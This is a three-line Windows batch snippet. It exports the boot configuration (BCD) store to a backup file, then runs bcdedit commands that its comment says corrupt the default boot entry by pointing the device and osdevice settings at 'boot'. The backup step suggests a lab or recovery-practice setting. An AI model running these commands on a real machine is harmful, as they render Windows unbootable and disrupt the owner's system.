:: Backup BCD store first, then corrupt the default boot entry
bcdedit /export C:\bcd_backup
bcdedit /set {default} device boot
bcdedit /set {default} osdevice boot
